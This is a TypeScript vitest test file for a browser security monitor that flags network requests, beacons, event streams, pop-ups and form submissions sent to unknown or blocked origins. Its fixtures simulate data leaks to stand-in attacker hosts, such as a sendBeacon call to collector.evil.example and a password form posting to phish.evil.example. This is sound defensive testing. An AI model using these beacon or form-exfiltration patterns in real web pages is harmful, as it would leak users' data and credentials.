import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { BrowserGuard } from "../src/BrowserGuard";
import { ResolveConfig } from "../src/Config/ResolveConfig";
import { GuardContext } from "../src/Core/GuardContext";
import { RiskEngine } from "../src/Core/RiskEngine";
import { NetworkDedupeWindowMs, NetworkDetector } from "../src/Detectors/NetworkDetector";
import { ReadFormTarget } from "../src/Monitors/ChannelMonitor";
import { ResourceMonitor } from "../src/Monitors/ResourceMonitor";
import type { NetworkRequestData, SecurityEvent } from "../src/Types/SecurityEvent";
import type { SecurityFinding } from "../src/Types/SecurityFinding";
import { FlushMicrotasks, ResetGuard } from "./Helpers";

const Page = { GetPageOrigin: () => "https://app.example.com", GetPageProtocol: () => "https:" };

function Request(
  data: Partial<NetworkRequestData>,
  timestamp = 0,
): SecurityEvent<NetworkRequestData> {
  return {
    Id: "evt",
    Timestamp: timestamp,
    Type: "network.request",
    Source: "Test",
    Data: {
      Transport: "fetch",
      Url: "https://unknown.example/x",
      Origin: "https://unknown.example",
      HasQuery: false,
      QueryLength: 0,
      ...data,
    },
  };
}

describe("NetworkDetector con otros canales", () => {
  function Evaluate(detector: NetworkDetector, event: SecurityEvent): SecurityFinding | null {
    const candidate = detector.Analyze(event);
    return candidate ? new RiskEngine({}, "info").Evaluate(candidate, event) : null;
  }

  function Create(): NetworkDetector {
    return new NetworkDetector(ResolveConfig(), Page);
  }

  it("un recurso pasivo de origen desconocido es low; con query larga, medium", () => {
    const detector = Create();
    const image = Evaluate(detector, Request({ Transport: "resource", InitiatorType: "img" }));
    expect(image).toMatchObject({ Severity: "low", Title: "Resource loaded from unknown origin" });
    expect(image?.Evidence).toMatchObject({ InitiatorType: "img" });

    const exfiltration = Evaluate(
      detector,
      Request({
        Transport: "resource",
        Url: "https://pixel.example/p.gif",
        Origin: "https://pixel.example",
        HasQuery: true,
        QueryLength: 180,
      }),
    );
    expect(exfiltration?.Severity).toBe("medium");
    expect(exfiltration?.Signals).toContain("network.large-query");
    expect(exfiltration?.Description).toContain("180 characters");
  });

  it("fetch con query larga hacia un origen desconocido → high", () => {
    const finding = Evaluate(Create(), Request({ HasQuery: true, QueryLength: 64 }));
    expect(finding?.Severity).toBe("high");
  });

  it("títulos por canal", () => {
    const titles = (["beacon", "eventsource", "form", "window-open"] as const).map(
      (transport) => Evaluate(Create(), Request({ Transport: transport }))?.Title,
    );
    expect(titles).toEqual([
      "Beacon sent to unknown origin",
      "Event stream from unknown origin",
      "Form submitted to unknown origin",
      "Window opened to unknown origin",
    ]);
    expect(Evaluate(Create(), Request({ Transport: "beacon" }))?.Severity).toBe("medium");
  });

  it("canales hacia orígenes bloqueados → critical", () => {
    const detector = new NetworkDetector(
      ResolveConfig({ Network: { BlockedOrigins: ["https://unknown.example"] } }),
      Page,
    );
    const finding = Evaluate(detector, Request({ Transport: "form" }));
    expect(finding).toMatchObject({
      Severity: "critical",
      Title: "Request to blocked origin via form submission",
    });
  });

  it("registrar un service worker siempre se reporta como low", () => {
    const finding = Evaluate(
      Create(),
      Request({
        Transport: "service-worker",
        Url: "https://app.example.com/sw.js",
        Origin: "https://app.example.com",
      }),
    );
    expect(finding).toMatchObject({ Severity: "low", Title: "Service worker registered" });
    expect(finding?.Evidence).not.toHaveProperty("Classification");
  });

  it("agrupa hallazgos equivalentes dentro de la ventana", () => {
    const detector = Create();
    const image = { Transport: "resource", InitiatorType: "img" } as const;
    expect(Evaluate(detector, Request(image, 0))).not.toBeNull();
    expect(Evaluate(detector, Request(image, 1000))).toBeNull();
    expect(
      Evaluate(detector, Request({ ...image, Origin: "https://other.example" }, 1000)),
    ).not.toBeNull();
    expect(Evaluate(detector, Request(image, NetworkDedupeWindowMs + 1))).not.toBeNull();
  });
});

describe("ReadFormTarget", () => {
  it("usa los atributos aunque un campo sombree action/method", () => {
    const form = document.createElement("form");
    form.setAttribute("action", "https://evil.example/steal");
    form.setAttribute("method", "post");
    form.innerHTML = '<input name="action" value="x"><input name="method" value="y">';
    expect(ReadFormTarget(form)).toEqual({ Url: "https://evil.example/steal", Method: "post" });
  });

  it("formaction/formmethod del botón tienen prioridad; sin action es la propia página", () => {
    const form = document.createElement("form");
    const button = document.createElement("button");
    button.setAttribute("formaction", "https://other.example/");
    button.setAttribute("formmethod", "post");
    expect(ReadFormTarget(form, button)).toEqual({ Url: "https://other.example/", Method: "post" });
    expect(ReadFormTarget(form)).toEqual({ Url: null, Method: "GET" });
    expect(ReadFormTarget(document.createElement("div"))).toBeNull();
  });
});

describe("ChannelMonitor integrado", () => {
  const Only = {
    Console: "silent",
    Monitors: {
      Fetch: false,
      Xhr: false,
      WebSocket: false,
      Dom: false,
      Csp: false,
      Prototype: false,
      Runtime: false,
      Sinks: false,
    },
  } as const;

  const restores: (() => void)[] = [];

  function Stub<T extends object>(owner: T, key: keyof T & string, value: unknown): void {
    const descriptor = Object.getOwnPropertyDescriptor(owner, key);
    Object.defineProperty(owner, key, { configurable: true, writable: true, value });
    restores.push(() => {
      if (descriptor) {
        Object.defineProperty(owner, key, descriptor);
      } else {
        Reflect.deleteProperty(owner, key);
      }
    });
  }

  beforeEach(() => {
    // jsdom no implementa estas APIs: se usan dobles.
    Stub(
      Navigator.prototype,
      "sendBeacon",
      vi.fn(() => true),
    );
    Stub(
      window,
      "open",
      vi.fn(() => null),
    );
    Stub(HTMLFormElement.prototype, "submit", vi.fn());
    Stub(
      window,
      "EventSource",
      class {
        public constructor(public readonly url: string) {}
      },
    );
  });

  afterEach(() => {
    ResetGuard();
    for (const restore of restores.splice(0).reverse()) {
      restore();
    }
    document.body.innerHTML = "";
  });

  async function Titles(guard: BrowserGuard): Promise<string[]> {
    await FlushMicrotasks();
    return guard.GetReport().Findings.map((finding) => finding.Title);
  }

  function LeakWithBeacon(): void {
    navigator.sendBeacon("https://collector.evil.example/b", "data");
  }

  it("observa sendBeacon, EventSource, window.open y form.submit con stack", async () => {
    const guard = BrowserGuard.Start(Only);
    LeakWithBeacon();
    new (window as unknown as { EventSource: new (url: string) => object }).EventSource(
      "https://stream.evil.example/s",
    );
    window.open("https://popup.evil.example/");
    window.open();
    const form = document.createElement("form");
    form.setAttribute("action", "https://phish.evil.example/login");
    form.innerHTML = '<input name="password" value="hunter2">';
    form.submit();

    expect(await Titles(guard)).toEqual([
      "Beacon sent to unknown origin",
      "Event stream from unknown origin",
      "Window opened to unknown origin",
      "Form submitted to unknown origin",
    ]);
    const [beacon] = guard.GetReport().Findings;
    expect(beacon?.Stack).toContain("LeakWithBeacon");
    expect(JSON.stringify(guard.GetReport())).not.toContain("hunter2");
  });

  it("el evento submit cubre envíos del usuario; same-origin no genera hallazgo", async () => {
    const guard = BrowserGuard.Start(Only);
    const external = document.createElement("form");
    external.setAttribute("action", "https://phish.evil.example/");
    external.addEventListener("submit", (event) => {
      event.preventDefault();
    });
    document.body.appendChild(external);
    external.dispatchEvent(new Event("submit", { bubbles: true, cancelable: true }));

    const local = document.createElement("form");
    document.body.appendChild(local);
    local.dispatchEvent(new Event("submit", { bubbles: true, cancelable: true }));

    expect(await Titles(guard)).toEqual(["Form submitted to unknown origin"]);
  });

  it("Stop restaura las funciones y quita el listener", async () => {
    const beacon = Navigator.prototype.sendBeacon;
    const guard = BrowserGuard.Start(Only);
    expect(Navigator.prototype.sendBeacon).not.toBe(beacon);
    guard.Stop();
    expect(Navigator.prototype.sendBeacon).toBe(beacon);
    const form = document.createElement("form");
    form.setAttribute("action", "https://phish.evil.example/");
    document.body.appendChild(form);
    form.dispatchEvent(new Event("submit", { bubbles: true }));
    expect(await Titles(guard)).toEqual([]);
  });
});

describe("ResourceMonitor", () => {
  class FakeObserver {
    public static supportedEntryTypes: readonly string[] = ["resource"];
    public static Instance: FakeObserver | null = null;
    public Disconnected = false;
    public constructor(public readonly Callback: (list: { getEntries(): unknown[] }) => void) {
      FakeObserver.Instance = this;
    }
    public observe(): void {}
    public disconnect(): void {
      this.Disconnected = true;
    }
    public Emit(entries: { name: string; initiatorType: string }[]): void {
      this.Callback({ getEntries: () => entries });
    }
  }

  function Setup(observer: unknown): {
    Monitor: ResourceMonitor;
    Events: SecurityEvent[];
    Context: GuardContext;
  } {
    const events: SecurityEvent[] = [];
    const fakeWindow = {
      PerformanceObserver: observer,
      location: window.location,
    } as unknown as Window & typeof globalThis;
    const context = new GuardContext(ResolveConfig(), fakeWindow, (event) => events.push(event));
    return { Monitor: new ResourceMonitor(context), Events: events, Context: context };
  }

  it("emite recursos y omite los que cubren otros monitores", () => {
    const { Monitor, Events, Context } = Setup(FakeObserver);
    Monitor.Start();
    expect(Monitor.IsRunning()).toBe(true);
    FakeObserver.Instance?.Emit([
      { name: "https://pixel.example/p.gif?c=abc", initiatorType: "img" },
      { name: "https://api.example/x", initiatorType: "fetch" },
      { name: "https://cdn.example/a.js", initiatorType: "script" },
      { name: "https://fonts.example/f.woff2", initiatorType: "css" },
    ]);
    Context.Flush();
    expect(Events.map((event) => event.Data)).toEqual([
      expect.objectContaining({
        Transport: "resource",
        Url: "https://pixel.example/p.gif",
        QueryLength: 5,
        InitiatorType: "img",
      }),
      expect.objectContaining({ Transport: "resource", InitiatorType: "css" }),
    ]);
    Monitor.Stop();
    expect(FakeObserver.Instance?.Disconnected).toBe(true);
  });

  it("no se inicia sin soporte de resource timing", () => {
    // Constructor sin supportedEntryTypes (navegadores antiguos).
    const unsupported = Setup(function LegacyObserver(): void {});
    unsupported.Monitor.Start();
    expect(unsupported.Monitor.IsRunning()).toBe(false);
    const none = Setup(undefined);
    none.Monitor.Start();
    expect(none.Monitor.IsRunning()).toBe(false);
  });
});
